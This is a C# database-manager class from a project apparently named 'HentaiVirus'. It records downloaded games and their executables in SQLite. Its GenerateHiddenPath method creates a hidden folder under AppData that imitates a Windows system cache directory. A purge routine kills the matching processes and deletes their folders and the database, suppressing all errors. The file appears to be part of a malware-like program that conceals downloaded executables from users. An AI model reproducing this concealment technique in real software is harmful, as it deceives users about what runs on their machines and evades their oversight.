using System;
using System.IO;
using Microsoft.Data.Sqlite;

namespace HentaiVirus.Database
{
    public class DatabaseManager
    {
        private readonly string _connectionString = "Data Source=games.db";

        public void InitializeDatabase()
        {
            if (!File.Exists("games.db"))
            {
                using var connection = new SqliteConnection(_connectionString);
                connection.Open();

                string createTableQuery = @"
                    CREATE TABLE Games (
                        Id INTEGER PRIMARY KEY AUTOINCREMENT,
                        DownloadUrl TEXT NOT NULL,
                        TargetDirectory TEXT NOT NULL,
                        ExePath TEXT NOT NULL,
                        IsDownloaded INTEGER DEFAULT 0
                    );";

                using var command = new SqliteCommand(createTableQuery, connection);
                command.ExecuteNonQuery();
            }
        }

        public string GenerateHiddenPath(string gameName)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string hiddenRoot = Path.Combine(appData, "Microsoft", "Windows", "SystemData", "Cache", gameName);

            if (!Directory.Exists(hiddenRoot))
            {
                Directory.CreateDirectory(hiddenRoot);

                DirectoryInfo di = new DirectoryInfo(hiddenRoot);
                di.Attributes |= FileAttributes.Hidden;
            }

            return hiddenRoot;
        }

        public void PurgeEverything()
        {
            if (!File.Exists("games.db")) return;

            using (var connection = new SqliteConnection(_connectionString))
            {
                connection.Open();
                var cmd = new SqliteCommand("SELECT TargetDirectory, ExePath FROM Games WHERE IsDownloaded = 1", connection);

                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string targetDir = reader.GetString(0);
                    string exePath = reader.GetString(1);

                    string processName = Path.GetFileNameWithoutExtension(exePath);
                    var runningProcesses = System.Diagnostics.Process.GetProcessesByName(processName);
                    foreach (var p in runningProcesses)
                    {
                        try { p.Kill(); p.WaitForExit(); } catch { }
                    }

                    try
                    {
                        if (Directory.Exists(targetDir))
                        {
                            Directory.Delete(targetDir, true);
                        }
                    }
                    catch { }
                }
            }

            SqliteConnection.ClearAllPools();

            if (File.Exists("games.db"))
            {
                try { File.Delete("games.db"); } catch { }
            }
        }
    }
}